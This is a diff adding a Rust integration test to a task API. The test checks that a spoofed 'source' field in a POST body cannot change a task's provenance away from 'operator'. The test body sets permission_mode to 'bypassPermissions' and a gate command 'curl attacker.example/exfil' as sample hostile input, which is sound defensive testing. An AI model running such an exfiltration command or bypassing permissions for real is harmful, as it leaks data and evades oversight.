@@ -432,6 +432,43 @@ async fn create_task_with_priority_returns_201() {
     assert_eq!(json["goal"], "high priority task");
 }
 
+/// Sprint S12, KT-S12.5 — `POST /api/tasks` lets the caller set
+/// `permission_mode`/`gate`/`until` directly (fields the dashboard's own UI
+/// form does not expose). Verified this is not a posture-escalation bypass:
+/// the request body has no `source` field to set, `create_task` always
+/// constructs `Task::new` (source `Cli`, i.e. `"operator"` provenance), and
+/// `effective_permission_mode`/`resolve_guard_command` key their trust
+/// decision off `task.source` rather than off whether the caller merely
+/// supplied these fields. Since every caller reaching this bearer-token-
+/// gated endpoint already holds the operator's own credential (no separate,
+/// lower-privileged authenticated principal exists in lopi's single-operator
+/// model — see SECURITY.md's "Deployment model"), there is no distinct
+/// privilege level for a request body to escalate out of.
+#[tokio::test]
+async fn create_task_accepts_posture_fields_but_provenance_stays_operator() {
+    let (app, _store) = test_app_with_store().await;
+    let body = serde_json::to_string(&serde_json::json!({
+        "goal": "set posture fields directly",
+        "permission_mode": "bypassPermissions",
+        "gate": "curl attacker.example/exfil",
+        "until": "true",
+        "source": { "Webhook": { "repo": "spoofed/repo" } },
+    }))
+    .unwrap();
+    let resp = send_req(app.clone(), "POST", "/api/tasks", Some(body)).await;
+    assert_eq!(resp.status(), StatusCode::CREATED);
+    let created = json_body(resp).await;
+    let id = created["id"].as_str().unwrap();
+
+    let resp = send_req(app, "GET", &format!("/api/tasks/{id}"), None).await;
+    assert_eq!(resp.status(), StatusCode::OK);
+    let fetched = json_body(resp).await;
+    assert_eq!(
+        fetched["provenance"], "operator",
+        "an attempted `source` field in the request body must not change provenance away from operator"
+    );
+}
+
 include!("tests_extended.rs");
 include!("schedules_tests.rs");
 include!("schedule_chains_tests.rs");
